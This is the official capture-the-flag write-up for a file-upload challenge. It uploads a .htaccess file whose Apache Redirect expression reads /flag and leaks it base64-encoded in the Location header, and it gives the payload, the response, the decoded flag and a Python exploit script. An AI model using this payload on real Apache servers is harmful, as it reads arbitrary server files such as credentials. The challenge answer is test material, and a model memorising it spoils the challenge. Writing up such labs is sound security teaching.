# WriteUp (Official Solution)

## 1. Reconnaissance

Upon opening the challenge, we see a file upload page titled "P-Phobia Upload".
Attempts to upload `shell.php` fail or are blocked.
Attempts to upload `test.txt` or images succeed, returning the path `/uploads/test.txt`.

We deduce that the challenge filters PHP extensions and runs on an Apache server. Attempting to upload a `.htaccess` file succeeds.

## 2. Vulnerability Analysis

Since we can upload `.htaccess`, we can control how Apache handles files in that directory.
Common strategies include:

1. **Parsing images as PHP**: Using `AddType application/x-httpd-php .jpg`. However, under the "P-Phobia" setting, the content `<?php` might also be filtered, or the server may disable PHP parsing for other extensions.
2. **Exfiltrating files via Apache Expressions**: This is a non-RCE solution that directly reads the Flag.

Apache 2.4.x supports the Expression Parser. We can use the `Redirect` directive to redirect requests and include the desired file content in the redirect URL.

**Payload Construction:**

```apache
redirect permanent "/%{BASE64:%{FILE:/flag}}"
```

* `redirect permanent`: Redirects using the 301 status code.
* `%{FILE:/flag}`: Reads the content of `/flag` from the file system.
* `%{BASE64:...}`: Base64 encodes the read content to prevent newlines or special characters from breaking the HTTP Header structure.

## 3. Steps to Solve

### Step 1: Create a malicious .htaccess

Create a file named `.htaccess` with the following content:

```apache
redirect permanent "/%{BASE64:%{FILE:/flag}}"
```

### Step 2: Upload the file

Upload the file via the challenge page. It is recommended to change the `Content-Type` to `application/octet-stream` to avoid detection as text, although the challenge likely only checks the extension.

### Step 3: Trigger the vulnerability

After a successful upload, access any file in the upload directory (even a non-existent one), for example: `http://target/uploads/.htaccess` or `http://target/uploads/non_exist`.

Apache will match the rule in `.htaccess`, attempt to read `/flag`, and perform the redirect.

### Step 4: Retrieve the Flag

Observe the HTTP response headers (via Browser DevTools or a Python script):

```http
HTTP/1.1 301 Moved Permanently
Date: Sun, 07 Dec 2025 01:01:08 GMT
Location: http://localhost:12223/ZmxhZ3sxNTA4NzhmNC1lYzU0LTQyZWQtOTcwYi03NTc4NWE3ZDBkOGR9IA==
```

Extract the Base64 string from the `Location` header:
`ZmxhZ3sxNTA4NzhmNC1lYzU0LTQyZWQtOTcwYi03NTc4NWE3ZDBkOGR9IA==`

Decode it to get the Flag:
`flag{150878f4-ec54-42ed-970b-75785a7d0d8d}`

## 4. EXP Script (Python)

```python
import requests
import base64
import re

url = "http://localhost:12223/" 
# 1. Upload malicious .htaccess
files = {
    'file': ('.htaccess', 'redirect permanent "/%{BASE64:%{FILE:/flag}}"', 'application/octet-stream')
}
requests.post(url, files=files)

# 2. Access any path to trigger the redirect
# allow_redirects=False is crucial, otherwise we miss the 301 Header
r = requests.get(url + "uploads/trigger", allow_redirects=False)

# 3. Extract Location Header and Decode
if r.status_code == 301:
    loc = r.headers.get('Location', '')
    print(f"Location Header: {loc}")
    # Extract the last part (Base64 string)
    if loc:
        b64_flag = loc.split("/")[-1]
        # Decode
        try:
            # Fix padding if necessary
            missing_padding = len(b64_flag) % 4
            if missing_padding:
                b64_flag += '=' * (4 - missing_padding)
            flag = base64.b64decode(b64_flag).decode()
            print(f"Flag: {flag}")
        except Exception as e:
            print(f"Decoding failed: {e}")
else:
    print(f"Redirect not triggered. Status Code: {r.status_code}")
```
